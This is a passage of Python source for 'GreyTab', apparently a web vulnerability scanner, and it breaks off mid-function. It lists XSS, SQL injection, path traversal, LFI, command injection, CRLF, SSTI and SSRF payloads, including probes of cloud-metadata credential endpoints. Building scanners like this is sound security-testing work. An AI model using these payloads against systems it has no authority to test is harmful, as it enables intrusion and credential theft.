"""
GreyTab - Auto Scanner
Async URL crawler + vulnerability payload tester.
Crawls target URLs and tests for reflected XSS, SQLi,
path traversal, and open redirect vulnerabilities.
"""

import asyncio
import hashlib
import html
import json
import os
import re
import statistics
import subprocess
import tempfile
import time
from dataclasses import dataclass, field
from typing import Any, Awaitable, Callable, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, quote, urlencode, urljoin, urlparse, urlunparse

import httpx
from core.config import CHROMIUM_BIN


@dataclass
class ScanFinding:
    """A single vulnerability finding."""

    url: str
    vuln_type: str  # xss, sqli, path_traversal, lfi, open_redirect
    severity: str  # info, low, medium, high, critical
    evidence: str
    payload: str
    parameter: str = ""
    timestamp: float = field(default_factory=time.time)
    request_raw: str = ""
    response_raw: str = ""
    ai_analysis: Optional[Dict[str, Any]] = None
    score: int = 0
    deterministic_confirmed: bool = False
    insertion_point: str = ""

    def to_dict(self) -> dict:
        return {
            "url": self.url,
            "vuln_type": self.vuln_type,
            "severity": self.severity,
            "evidence": self.evidence,  # Full evidence
            "payload": self.payload,
            "parameter": self.parameter,
            "timestamp": self.timestamp,
            "request_raw": self.request_raw,
            "response_raw": self.response_raw,
            "ai_analysis": self.ai_analysis,
            "score": self.score,
            "deterministic_confirmed": self.deterministic_confirmed,
            "insertion_point": self.insertion_point,
        }


@dataclass
class ScanTestEntry:
    """A single scanner payload execution (positive or negative)."""

    id: int
    timestamp: float
    url: str
    method: str
    test_type: str
    parameter: str
    payload: str
    stage: str  # baseline, probe, confirm, control
    outcome: str  # no_signal, signal, confirmed, error, baseline, info
    success: bool
    elapsed_ms: int
    status_code: int
    evidence: str = ""
    request_raw: str = ""
    response_raw: str = ""

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "timestamp": self.timestamp,
            "url": self.url,
            "method": self.method,
            "test_type": self.test_type,
            "parameter": self.parameter,
            "payload": self.payload,
            "stage": self.stage,
            "outcome": self.outcome,
            "success": self.success,
            "elapsed_ms": self.elapsed_ms,
            "status_code": self.status_code,
            "evidence": self.evidence,
            "request_raw": self.request_raw,
            "response_raw": self.response_raw,
        }


# -- Payloads -----------------------------------------------------------------

XSS_PAYLOAD_TEMPLATES = [
    # Basic
    '"/><svg/onload=alert("{m}")>',
    "'><img src=x onerror=alert('{m}')>",
    "<script>confirm('{m}')</script>",
    "{{{m}}}",
    "javascript:alert('{m}')",
    "<body onpageshow=alert('{m}')>",
    # Polyglots
    "javascript://%250Aalert('{m}')",
    "//--></script><svg/onload=alert('{m}')>",
    "'-alert('{m}')-'",
    "\";alert('{m}');//",
    "<img src=x:x onerror=alert('{m}')>",
    "<details openontoggle=alert('{m}')>",
    # Headless-confirmable variants (DOM mutation)
    "<script>document.documentElement.setAttribute('data-greytab-exec','{m}')</script>",
    "\"/><img src=x onerror=document.documentElement.setAttribute('data-greytab-exec','{m}')>",
    "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;img src=1 onerror=alert('{m}')&gt;\">",
]

SQLI_ERROR_PAYLOADS = [
    "'",
    "\")",
    "' OR '1'='1' -- ",
    "1' OR 1=1--",
    "' UNION SELECT NULL--",
    "' OR 1=CAST((SELECT @@version) AS INT)--",
]

SQLI_TIME_PAYLOADS = [
    # MySQL / MariaDB
    "' OR SLEEP(5)--",
    "\" OR SLEEP(5)--",
    # PostgreSQL
    "'||pg_sleep(5)--",
    "\"; SELECT pg_sleep(5)--",
    # MSSQL
    "'; WAITFOR DELAY '0:0:5'--",
    "\"; WAITFOR DELAY '0:0:5'--",
    # Polyglot-ish
    "(SELECT(0)FROM(SELECT(SLEEP(5)))a)",
]

SQLI_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"PostgreSQL.*ERROR",
    r"ORA-\d{5}",
    r"Microsoft.*ODBC.*SQL Server",
    r"Unclosed quotation mark",
    r"quoted string not properly terminated",
    r"SQLite3::SQLException",
    r"SQLSTATE\[",
    r"Dynamic SQL Error",
    r"You have an error in your SQL syntax",
]

PATH_TRAVERSAL_PAYLOADS = [
    # Basic
    "../../../../../../etc/passwd",
    "../../../../../../windows/win.ini",
    # URL Encoded
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # Unicode / Double encoding
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    # Null byte injection
    "../../../../../../etc/passwd%00",
    "../../../../../../windows/win.ini%00",
    # Windows specific
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "/var/www/html/../../../../../../etc/passwd",
]

PATH_TRAVERSAL_SIGNATURES = [
    "root:x:0:0:",
    "daemon:x:",
    "nologin",
    "[extensions]",
    "[fonts]",
    "for 16-bit app support",
]

LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    "../../../../../../windows/win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=../../../../index.php",
]

LFI_SIGNATURES = [
    "root:x:0:0:",
    "daemon:x:",
    "[extensions]",
    "[fonts]",
    "for 16-bit app support",
    "<?php",
    "db_password",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.example",
    "//evil.example",
    "https:%2f%2fevil.example",
    "/\\evil.example",
    "//evil.example/%2e%2e",
]

REDIRECT_HOST_MARKERS = ("evil.example",)

# -- SSTI Payloads ---------------------------------------------------------------

SSTI_PAYLOADS = [
    # Jinja2 / Twig
    {"payload": "{{7*7}}", "expect": "49", "engine": "jinja2/twig"},
    {"payload": "{{7*'7'}}", "expect": "7777777", "engine": "jinja2"},
    {"payload": "${7*7}", "expect": "49", "engine": "freemarker/velocity"},
    {"payload": "<%= 7*7 %>", "expect": "49", "engine": "erb/jsp"},
    {"payload": "#{7*7}", "expect": "49", "engine": "ruby/java_el"},
    {"payload": "{php}echo 7*7;{/php}", "expect": "49", "engine": "smarty"},
    {"payload": "${{7*7}}", "expect": "49", "engine": "mako/generic"},
]

# -- Command Injection Payloads --------------------------------------------------

CMDI_TIME_PAYLOADS = [
    # Unix sleep-based
    "; sleep 5",
    "| sleep 5",
    "|| sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    "& sleep 5 &",
    # Windows ping-based (always 5s)
    "& ping -n 6 127.0.0.1 &",
    "| ping -n 6 127.0.0.1",
]

CMDI_CANARY_PAYLOADS = [
    # Unix — output marker
    {"payload": "; echo {canary}", "check": "output"},
    {"payload": "| echo {canary}", "check": "output"},
    {"payload": "`echo {canary}`", "check": "output"},
    {"payload": "$(echo {canary})", "check": "output"},
]

# -- CRLF / Header Injection Payloads -------------------------------------------

CRLF_PAYLOADS = [
    "\r\nX-Injected: greytab",
    "%0d%0aX-Injected:%20greytab",
    "%0aX-Injected:%20greytab",
    "\r\nSet-Cookie: greytab=injected",
    "%0d%0aSet-Cookie:%20greytab=injected",
]

CRLF_HEADER_MARKER = "x-injected"
CRLF_COOKIE_MARKER = "greytab=injected"

# -- SSRF Payloads ---------------------------------------------------------------

SSRF_PAYLOADS = [
    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    # Azure metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Generic internal
    "http://127.0.0.1:22",
    "http://localhost:6379",
    "http://[::1]/",
]

SSRF_SIGNATURES = [
    "ami-", "instance-id", "security-credentials",
    "computeMetadata", "google.internal",
    "SSH-", "+PONG", "-ERR",
]

# -- Passive Analysis Constants --------------------------------------------------

SECURITY_HEADERS_EXPECTED = [
    ("strict-transport-security", "Missing HSTS header", "medium"),
    ("content-security-policy", "Missing CSP header", "low"),
    ("x-frame-options", "Missing X-Frame-Options header (clickjacking risk)", "low"),
    ("x-content-type-options", "Missing X-Content-Type-Options header", "info"),
    ("referrer-policy", "Missing Referrer-Policy header", "info"),
    ("permissions-policy", "Missing Permissions-Policy header", "info"),
]

INFO_DISCLOSURE_PATTERNS = [
    (re.compile(r"(?:Exception|Error|Traceback|Stack trace|at \w+\.\w+\()", re.IGNORECASE), "Stack trace / debug error exposed"),
    (re.compile(r"(?:phpinfo\(\)|DEBUG\s*=\s*True|DJANGO_SETTINGS_MODULE)", re.IGNORECASE), "Debug mode / config exposed"),
    (re.compile(r"<!--.*(?:password|secret|api[_-]?key|token).*-->", re.IGNORECASE), "Sensitive data in HTML comments"),
]

COMMON_TEST_PARAMS: Dict[str, str] = {
    "q": "test",
    "id": "1",
    "search": "test",
    "page": "1",
    "file": "index",
    "next": "/",
    "url": "https://example.org",
    "redirect": "https://example.org",
}

COMMON_HEADER_POINTS: Dict[str, str] = {
    "User-Agent": "GreyTabScanner/1.0",
    "Referer": "https://scanner.invalid/ref",
    "X-Forwarded-For": "127.0.0.1",
    "X-Original-URL": "/",
    "X-Rewrite-URL": "/",
}

COMMON_COOKIE_POINTS: Dict[str, str] = {
    "session": "scanner",
    "token": "scanner",
    "id": "1",
    "user": "scanner",
}

COMMON_JSON_KEYS: Dict[str, Any] = {
    "id": 1,
    "q": "test",
    "search": "test",
    "file": "index",
    "url": "https://example.org",
    "redirect": "https://example.org",
}

COMMON_XML_KEYS: Dict[str, str] = {
    "id": "1",
    "q": "test",
    "file": "index",
    "url": "https://example.org",
}

VOLATILE_VALUE_PATTERNS = [
    re.compile(r"\b[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}\b", re.IGNORECASE),
    re.compile(r"\b\d{4}-\d{2}-\d{2}[tT ][0-9:\.\+\-Z]{3,}\b"),
    re.compile(r"\b(?:nonce|token|csrf|trace|request[_-]?id)[\"'=:\s]{1,6}[A-Za-z0-9_\-]{6,}", re.IGNORECASE),
]


class ScannerEngine:
    """Async scanner: crawls URLs and tests for vulnerabilities."""

    def __init__(self, broadcast_fn: Callable[..., Awaitable] = None):
        self.running = False
        self.findings: List[ScanFinding] = []
        self.test_log: List[ScanTestEntry] = []
        self.crawled_urls: Set[str] = set()
        self.queued_urls: Set[str] = set()
        self.urls_to_crawl: asyncio.Queue = asyncio.Queue()
        self.target_host: str = ""
        self.target_url: str = ""
        self.scan_depth: int = 3
        self.crawl_enabled: bool = True
        self.test_types: List[str] = ["xss", "sqli", "path_traversal", "lfi", "open_redirect", "ssti", "cmdi", "crlf", "ssrf", "cors", "oast"]
        self.scan_headers: Dict[str, str] = {}
        self.fuzz_dirs: bool = False
        self.broadcast = broadcast_fn
        self._task: Optional[asyncio.Task] = None
        self._cancel_event = asyncio.Event()
        self._findings_hashes: Set[str] = set()
        self.ai_config: Dict[str, Any] = {}
        self.ai_analyzer: Optional[Callable[[Dict[str, Any], Dict[str, Any]], Awaitable[Dict[str, Any]]]] = None

        self._started_at: float = 0.0
        self._last_progress_emit: float = 0.0
        self._progress_interval_s: float = 0.2
        self._activity_seq: int = 0

        self._requests_sent: int = 0
        self._tests_total: int = 0
        self._tests_completed: int = 0
        self._errors_count: int = 0
        self._current_url: str = ""
        self._current_stage: str = "idle"
        self._test_seq: int = 0
        self._max_test_log_entries: int = 25000
        self._ai_reviews_used: int = 0
        self._ai_cache: Dict[str, Dict[str, Any]] = {}
        self._feedback_stats: Dict[str, Dict[str, int]] = {}
        self._xss_headless_confirm: bool = True
        self._oast_enabled: bool = False
        self._oast_base_url: str = ""
        self._oast_hit_checker: Optional[Callable[[str], Awaitable[bool]]] = None

    def status(self) -> dict:
        elapsed_s = max(0.0, time.time() - self._started_at) if self._started_at else 0.0
        progress_percent = 0
        if self._tests_total > 0:
            progress_percent = int(min(99, (self._tests_completed / self._tests_total) * 100))
        elif self.crawled_urls:
            discovered = max(1, len(self.crawled_urls) + len(self.queued_urls))
            progress_percent = int(min(99, (len(self.crawled_urls) / discovered) * 100))

        ai_cfg = self.ai_config if isinstance(self.ai_config, dict) else {}
        max_reviews = ai_cfg.get("max_reviews_per_scan", 20)
        try:
            max_reviews = int(max_reviews)
        except (TypeError, ValueError):
            max_reviews = 20
        max_reviews = max(0, min(max_reviews, 200))

        return {
            "running": self.running,
            "urls_crawled": len(self.crawled_urls),
            "urls_queued": len(self.queued_urls),
            "queue_size": self.urls_to_crawl.qsize(),
            "findings_count": len(self.findings),
            "findings": [f.to_dict() for f in self.findings],
            "target": self.target_host,
            "requests_sent": self._requests_sent,
            "tests_total": self._tests_total,
            "tests_completed": self._tests_completed,
            "test_log_count": len(self.test_log),
            "errors_count": self._errors_count,
            "ai_reviews_used": self._ai_reviews_used,
            "ai_reviews_budget": max_reviews,
            "ai_cache_size": len(self._ai_cache),
            "ai_cache_enabled": bool(ai_cfg.get("cache_enabled", True)),
            "current_url": self._current_url[:200],
            "current_stage": self._current_stage,
            "elapsed_s": round(elapsed_s, 2),
            "progress_percent": progress_percent,
            "rate_rps": round((self._requests_sent / elapsed_s), 2) if elapsed_s > 0 else 0,
            "xss_headless_confirm": self._xss_headless_confirm,
            "oast_enabled": self._oast_enabled,
            "oast_base_url": self._oast_base_url,
        }

    def get_test_log(self, limit: int = 0) -> List[dict]:
        """Return scanner payload-attempt log entries."""
        if limit and limit > 0:
            items = self.test_log[-limit:]
        else:
            items = self.test_log
        return [t.to_dict() for t in items]

    async def start(
        self, 
        target_url: str, 
        scan_depth: int = 3, 
        test_types: List[str] = None,
        headers: Dict[str, str] = None,
        fuzz_dirs: bool = False,
        crawl_enabled: bool = True,
        ai_config: Optional[Dict[str, Any]] = None,
        ai_analyzer: Optional[Callable[[Dict[str, Any], Dict[str, Any]], Awaitable[Dict[str, Any]]]] = None,
        xss_headless_confirm: bool = True,
        oast_enabled: bool = False,
        oast_base_url: str = "",
        oast_hit_checker: Optional[Callable[[str], Awaitable[bool]]] = None,
    ):
        """Start the scanner."""
        if self.running:
            raise RuntimeError("Scanner already running")

        self.running = True
        self.findings = []
        self.test_log = []
        self.crawled_urls = set()
        self.queued_urls = set()
        self._findings_hashes = set()
        self._cancel_event.clear()
        self.urls_to_crawl = asyncio.Queue()
        
        self.target_url = target_url
        self.scan_headers = headers or {}
        self.fuzz_dirs = fuzz_dirs
        self.crawl_enabled = bool(crawl_enabled)
        self.ai_config = ai_config or {}
        self.ai_analyzer = ai_analyzer

        self._started_at = time.time()
        self._last_progress_emit = 0.0
        self._activity_seq = 0
        self._requests_sent = 0
        self._tests_total = 0
        self._tests_completed = 0
        self._errors_count = 0
        self._current_url = ""
        self._current_stage = "initializing"
        self._test_seq = 0
        self._ai_reviews_used = 0
        self._ai_cache = dict((self.ai_config or {}).get("runtime_cache", {}) or {})
        self._feedback_stats = dict((self.ai_config or {}).get("feedback_stats", {}) or {})
        self._xss_headless_confirm = bool(xss_headless_confirm)
        self._oast_enabled = bool(oast_enabled)
        self._oast_base_url = str(oast_base_url or "").strip().rstrip("/")
        self._oast_hit_checker = oast_hit_checker

        parsed = urlparse(target_url)
        self.target_host = parsed.hostname or ""
        self.scan_depth = max(1, min(scan_depth, 6))
        if test_types:
            self.test_types = test_types

        await self._enqueue_url(target_url, depth=0, reason="seed")
        await self._emit_progress(force=True, activity={"type": "start", "message": f"Scan started for {target_url}"})

        self._task = asyncio.create_task(self._scan_loop())

    async def stop(self):
        """Stop the scanner."""
        self._cancel_event.set()
        self.running = False
        self._current_stage = "stopping"
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except (asyncio.CancelledError, Exception):
                pass

    async def _scan_loop(self):
        """Main scan loop: crawl and test URLs."""
        try:
            async with httpx.AsyncClient(
                verify=False,
                follow_redirects=True,
                timeout=15.0,
                limits=httpx.Limits(max_connections=16, max_keepalive_connections=8),
                headers=self.scan_headers,
            ) as client:
                
                # 0. Tech Detection
                await self._detect_tech(client, self.target_url)

                # 1. Directory Fuzzing (Optional)
                if self.fuzz_dirs:
                    await self._fuzz_directories(client, self.target_url)

                while not self._cancel_event.is_set():
                    try:
                        url, depth = await asyncio.wait_for(self.urls_to_crawl.get(), timeout=2.0)
                    except asyncio.TimeoutError:
                        if self.urls_to_crawl.empty():
                            break
                        await self._emit_progress()
                        continue

                    self.queued_urls.discard(url)
                    if url in self.crawled_urls:
                        continue
                    self.crawled_urls.add(url)
                    self._current_url = url
                    self._current_stage = "fetching"

                    await self._emit_progress(activity={
                        "type": "url_start",
                        "url": url,
                        "depth": depth,
                        "message": f"Fetching {url}",
                    })

                    try:
                        resp = await client.get(url)
                        self._requests_sent += 1

                        if self.crawl_enabled and depth < self.scan_depth and "text/html" in (resp.headers.get("content-type") or ""):
                            links = self._extract_links(resp.text, url)
                            discovered_now = 0
                            for link in links:
                                if await self._enqueue_url(link, depth + 1, reason="crawl"):
                                    discovered_now += 1

                            if discovered_now:
                                await self._emit_progress(activity={
                                    "type": "crawl_expand",
                                    "url": url,
                                    "depth": depth,
                                    "count": discovered_now,
                                    "message": f"Discovered {discovered_now} new URLs",
                                })

                        self._current_stage = "testing"
                        await self._test_url(client, url, resp)

                        self._current_stage = "completed_url"
                        await self._emit_progress(activity={
                            "type": "url_done",
                            "url": url,
                            "depth": depth,
                            "message": f"Completed checks for {url}",
                        })

                    except httpx.TimeoutException:
                        self._errors_count += 1
                        await self._emit_progress(activity={
                            "type": "timeout",
                            "url": url,
                            "depth": depth,
                            "message": f"Timeout while scanning {url}",
                        })
                        continue
                    except Exception as e:
                        self._errors_count += 1
                        print(f"[Scanner] Error scanning {url}: {e}")
                        await self._emit_progress(activity={
                            "type": "error",
                            "url": url,
                            "depth": depth,
                            "message": f"Error scanning {url}: {str(e)[:120]}",
                        })
                        continue

        except asyncio.CancelledError:
            pass
        except Exception as e:
            self._errors_count += 1
            print(f"[Scanner] Fatal error: {e}")
        finally:
            self.running = False
            self._current_stage = "done"
            if self.broadcast:
                status = self.status()
                status["progress_percent"] = 100
                await self.broadcast("scanner_complete", status)

    async def _enqueue_url(self, url: str, depth: int, reason: str) -> bool:
        parsed = urlparse(url)
        if parsed.scheme not in ("http", "https"):
            return False
        if parsed.hostname != self.target_host:
            return False

        normalized = urlunparse(parsed._replace(fragment=""))
        if normalized in self.crawled_urls or normalized in self.queued_urls:
            return False

        self.queued_urls.add(normalized)
        await self.urls_to_crawl.put((normalized, depth))
        await self._emit_progress(activity={
            "type": "queue",
            "url": normalized,
            "depth": depth,
            "reason": reason,
            "message": f"Queued {normalized}",
        })
        return True

    async def _emit_progress(self, force: bool = False, activity: Optional[dict] = None):
        if not self.broadcast:
            return

        now = time.time()
        if not force and (now - self._last_progress_emit) < self._progress_interval_s and not activity:
            return

        payload = self.status()
        if activity:
            self._activity_seq += 1
            activity["seq"] = self._activity_seq
            activity["ts"] = now
            payload["activity"] = activity
        await self.broadcast("scanner_progress", payload)
        self._last_progress_emit = now

    @staticmethod
    def _build_raw_request(
        method: str,
        url: str,
        headers: Optional[Dict[str, str]] = None,
        body: str = "",
    ) -> str:
        """Build a consistent HTTP/1.1 raw request string."""
        parsed = urlparse(url)
        path = parsed.path or "/"
        if parsed.query:
            path += f"?{parsed.query}"
        lines = [f"{method.upper()} {path} HTTP/1.1"]
        lines.append(f"Host: {parsed.netloc}")
        if headers:
            for k, v in headers.items():
                if k.lower() == "host":
                    continue
                lines.append(f"{k}: {v}")
        raw = "\r\n".join(lines) + "\r\n\r\n"
        if body:
            raw += body
        return raw

    @staticmethod
    def _build_raw_response(
        resp: Optional["httpx.Response"],
        body_limit: int = 10000,
    ) -> str:
        """Build a consistent HTTP/1.1 raw response string."""
        if not resp:
            return ""
        lines = [f"HTTP/1.1 {resp.status_code} {resp.reason_phrase or ''}"]
        for k, v in resp.headers.items():
            lines.append(f"{k}: {v}")
        raw = "\r\n".join(lines) + "\r\n\r\n"
        body = resp.text or ""
        if len(body) > body_limit:
            raw += body[:body_limit] + f"\n\n...[truncated {len(body) - body_limit} chars]"
        else:
            raw += body
        return raw

    @staticmethod
    def _clip_raw(value: str, limit: int = 12000) -> str:
        text = value if isinstance(value, str) else ""
        if len(text) <= limit:
            return text
        return f"{text[:limit]}\n\n...[truncated {len(text) - limit} chars]"

    async def _record_test_entry(
        self,
        *,
        url: str,
        method: str,
        test_type: str,
        parameter: str,
        payload: str,
        stage: str,
        outcome: str,
        success: bool,
        elapsed_s: float,
        status_code: int,
        evidence: str = "",
        request_raw: str = "",
        response_raw: str = "",
    ):
        """Record and broadcast a scanner test attempt (including negatives)."""
        self._test_seq += 1
        entry = ScanTestEntry(
            id=self._test_seq,
            timestamp=time.time(),
            url=url,
            method=(method or "GET").upper(),
            test_type=test_type,
            parameter=parameter,
            payload=payload,
            stage=stage,
            outcome=outcome,
            success=bool(success),
            elapsed_ms=int(max(0.0, elapsed_s) * 1000),
            status_code=int(status_code or 0),
            evidence=(evidence or "")[:450],
            request_raw=self._clip_raw(request_raw),
            response_raw=self._clip_raw(response_raw),
        )
        self.test_log.append(entry)
        if len(self.test_log) > self._max_test_log_entries:
            self.test_log = self.test_log[-self._max_test_log_entries :]

        if self.broadcast:
            await self.broadcast("scanner_test_result", entry.to_dict())

    @staticmethod
    def _median_and_std(values: List[float]) -> Tuple[float, float]:
        clean = [float(v) for v in values if isinstance(v, (int, float))]
        if not clean:
            return 0.0, 0.0
        median_v = float(statistics.median(clean))
        std_v = float(statistics.pstdev(clean)) if len(clean) > 1 else 0.0
        return median_v, std_v

    @staticmethod
    def _looks_xss_execution_context(body: str, marker: str) -> bool:
        if not body or not marker:
            return False
        lower = body.lower()
        marker_l = marker.lower()
        idx = lower.find(marker_l)
        if idx == -1:
            return False
        start = max(0, idx - 140)
        end = min(len(lower), idx + 140)
        window = lower[start:end]
        indicators = (
            "<script",
            "onerror=",
            "onload=",
            "onmouseover=",
            "javascript:",
            "<svg",
            "<img",
            "<details",
        )
        return any(token in window for token in indicators)

    @staticmethod
    def _normalize_response_text(text: str) -> str:
        body = (text or "")[:20000]
        for pattern in VOLATILE_VALUE_PATTERNS:
            body = pattern.sub("<volatile>", body)
        body = re.sub(r"\b\d{10,}\b", "<num>", body)
        body = re.sub(r"\s+", " ", body).strip().lower()
        return body

    def _has_structural_diff(self, baseline_resp: Optional[httpx.Response], probe_resp: Optional[httpx.Response]) -> bool:
        if not baseline_resp or not probe_resp:
            return True
        if baseline_resp.status_code != probe_resp.status_code:
            return True
        base_len = len(baseline_resp.text or "")
        probe_len = len(probe_resp.text or "")
        if abs(base_len - probe_len) > 80:
            return True
        return self._normalize_response_text(baseline_resp.text) != self._normalize_response_text(probe_resp.text)

    @staticmethod
    def _parse_cookie_header(cookie_header: str) -> Dict[str, str]:
        out: Dict[str, str] = {}
        for part in (cookie_header or "").split(";"):
            if "=" not in part:
                continue
            k, v = part.split("=", 1)
            key = k.strip()
            if not key:
                continue
            out[key] = v.strip()
        return out

    @staticmethod
    def _build_xml_body(values: Dict[str, Any], root_tag: str = "root") -> str:
        parts = [f"<{root_tag}>"]
        for k, v in values.items():
            tag = re.sub(r"[^a-zA-Z0-9_\-]", "", str(k)) or "item"
            val = html.escape(str(v))
            parts.append(f"<{tag}>{val}</{tag}>")
        parts.append(f"</{root_tag}>")
        return "".join(parts)

    async def _confirm_xss_headless(self, response_html: str, marker: str) -> bool:
        """Try real JS execution confirmation in headless Chromium by checking DOM mutation."""
        if not self._xss_headless_confirm or not response_html or not marker:
            return False
        chrome_bin = os.environ.get("GREYTAB_CHROME_BIN", str(CHROMIUM_BIN))
        if not chrome_bin:
            return False
        mutation_marker = f"data-greytab-exec=\"{marker}\""
        html_doc = f"<!doctype html><html><head><meta charset=\"utf-8\"></head><body>{response_html}</body></html>"
        try:
            with tempfile.NamedTemporaryFile("w", suffix=".html", delete=False, encoding="utf-8") as fp:
                fp.write(html_doc)
                tmp_path = fp.name
            cmd = [
                chrome_bin,
                "--headless=new",
                "--disable-gpu",
                "--allow-file-access-from-files",
                "--virtual-time-budget=2500",
                "--dump-dom",
                f"file://{tmp_path}",
            ]
            completed = await asyncio.to_thread(
                subprocess.run,
                cmd,
                capture_output=True,
                text=True,
                timeout=8,
                check=False,
            )
            dom_out = (completed.stdout or "")[:200000]
            return mutation_marker in dom_out
        except Exception:
            return False
        finally:
            try:
                if "tmp_path" in locals() and tmp_path:
                    os.unlink(tmp_path)
            except Exception:
                pass

    async def _detect_tech(self, client: httpx.AsyncClient, url: str):
        """Simple tech detection based on headers and body."""
        try:
            self._tests_total += 1
            started = time.perf_counter()
            resp = await client.get(url, timeout=10.0)
            elapsed = time.perf_counter() - started
            self._requests_sent += 1
            self._tests_completed += 1
            await self._emit_progress()
            req_raw = self._build_raw_request("GET", url, headers=dict(self.scan_headers or {}))
            res_raw = self._build_raw_response(resp, body_limit=2500)
            server = resp.headers.get("server", "")
            powered_by = resp.headers.get("x-powered-by", "")
            
            techs = []
            if server: techs.append(f"Server: {server}")
            if powered_by: techs.append(f"PoweredBy: {powered_by}")
            
            body = resp.text.lower()
            if "wordpress" in body: techs.append("WordPress")
            if "drupal" in body: techs.append("Drupal")
            if "joomla" in body: techs.append("Joomla")
            if ("laravel" in body or "laravel_session" in resp.cookies): techs.append("Laravel")
            if "php" in body or "phpsessid" in resp.cookies: techs.append("PHP")
            if "jquery" in body: techs.append("jQuery")
            if "react" in body: techs.append("React")
            
            if techs:
                 await self._record_test_entry(
                    url=url,
                    method="GET",
                    test_type="tech_detect",
                    parameter="global",
                    payload="fingerprint",
                    stage="probe",
                    outcome="info",
                    success=True,
                    elapsed_s=elapsed,
                    status_code=resp.status_code,
                    evidence=f"Detected {len(techs)} technology hints",
                    request_raw=req_raw,
                    response_raw=res_raw,
                )
                 await self._add_finding(
                    ScanFinding(
                        url=url,
                        vuln_type="info",
                        severity="info",
                        evidence="Technologies detected:\n" + "\n".join(techs),
                        payload="",
                        parameter="N/A",
                        insertion_point="tech_detect",
                    )
                )
            else:
                await self._record_test_entry(
                    url=url,
                    method="GET",
                    test_type="tech_detect",
                    parameter="global",
                    payload="fingerprint",
                    stage="probe",
                    outcome="no_signal",
                    success=True,
                    elapsed_s=elapsed,
                    status_code=resp.status_code,
                    evidence="No strong technology fingerprint detected",
                    request_raw=req_raw,
                    response_raw=res_raw,
                )
        except Exception:
            self._errors_count += 1
            self._tests_completed += 1
            await self._emit_progress()
            pass

    async def _fuzz_directories(self, client: httpx.AsyncClient, base_url: str):
        """Fuzz common directories."""
        common_dirs = [
             "admin", "administrator", "login", "dashboard", "backup", "bak",
             "api", "public", ".git", ".env", "config", "test", "dev",
             "wp-admin", "user", "static", "assets", "uploads"
        ]
        
        # Adjust total
        self._tests_total += len(common_dirs)
        
        for d in common_dirs:
            if self._cancel_event.is_set():
                return
                
            test_url = urljoin(base_url if base_url.endswith('/') else base_url + '/', d)
            try:

                started = time.perf_counter()
                resp = await client.get(test_url, timeout=5.0)
                elapsed = time.perf_counter() - started
                self._requests_sent += 1
                self._tests_completed += 1
                await self._emit_progress()
                req_raw = self._build_raw_request("GET", test_url, headers=dict(self.scan_headers or {}))
                res_raw = self._build_raw_response(resp, body_limit=500)
                
                # Report interesting codes
                interesting = resp.status_code in (200, 401, 403, 500)
                await self._record_test_entry(
                    url=test_url,
                    method="GET",
                    test_type="dir_fuzz",
                    parameter="url_path",
                    payload=d,
                    stage="probe",
                    outcome="signal" if interesting else "no_signal",
                    success=True,
                    elapsed_s=elapsed,
                    status_code=resp.status_code,
                    evidence=f"Directory fuzz status={resp.status_code}",
                    request_raw=req_raw,
                    response_raw=res_raw,
                )
                if interesting:
                    await self._add_finding(
                        ScanFinding(
                            url=test_url,
                            vuln_type="discovery",
                            severity="low" if resp.status_code == 200 else "info",
                            evidence=f"Discovered path: Status {resp.status_code}",
                            payload=d,
                            parameter="URL Path",
                            request_raw=req_raw,
                            response_raw=res_raw,
                            insertion_point="dir_fuzz",
                        )
                    )
            except Exception as exc:
                self._errors_count += 1
                self._tests_completed += 1
                await self._emit_progress()
                await self._record_test_entry(
                    url=test_url,
                    method="GET",
                    test_type="dir_fuzz",
                    parameter="url_path",
                    payload=d,
                    stage="probe",
                    outcome="error",
                    success=False,
                    elapsed_s=0.0,
                    status_code=0,
                    evidence=f"Directory fuzz request failed: {str(exc)[:180]}",
                    request_raw=self._build_raw_request("GET", test_url, headers=dict(self.scan_headers or {})),
                    response_raw="",
                )

    def _extract_links(self, html_text: str, base_url: str) -> List[str]:
        """Extract links from HTML."""
        links = set()

        for match in re.finditer(r'href=["\']([^"\']+)["\']', html_text, re.IGNORECASE):
            href = match.group(1).strip()
            if href.startswith("#") or href.startswith("javascript:") or href.startswith("mailto:"):
                continue
            full = urljoin(base_url, href)
            parsed = urlparse(full)
            clean = urlunparse(parsed._replace(fragment=""))
            links.add(clean)

        for match in re.finditer(r'action=["\']([^"\']+)["\']', html_text, re.IGNORECASE):
            action = match.group(1).strip()
            full = urljoin(base_url, action)
            parsed = urlparse(full)
            clean = urlunparse(parsed._replace(fragment=""))
            links.add(clean)

        return list(links)[:80]

    def _parse_forms(self, html_text: str, base_url: str) -> List[Dict]:
        """Extract forms and their inputs from HTML."""
        forms = []
        # simplistic regex-based form parser (robust enough for simple audits)
        # In a real tool, use BeautifulSoup/lxml
        
        form_matches = re.finditer(r'<form(.*?)>(.*?)</form>', html_text, re.IGNORECASE | re.DOTALL)
        for fmatch in form_matches:
            attrs_str = fmatch.group(1)
            inner_html = fmatch.group(2)
            
            action_match = re.search(r'action=["\']([^"\']+)["\']', attrs_str, re.IGNORECASE)
            method_match = re.search(r'method=["\']([^"\']+)["\']', attrs_str, re.IGNORECASE)
            
            action = action_match.group(1).strip() if action_match else ""
            method = method_match.group(1).strip().upper() if method_match else "GET"
            
            # Resolve action URL
            if action:
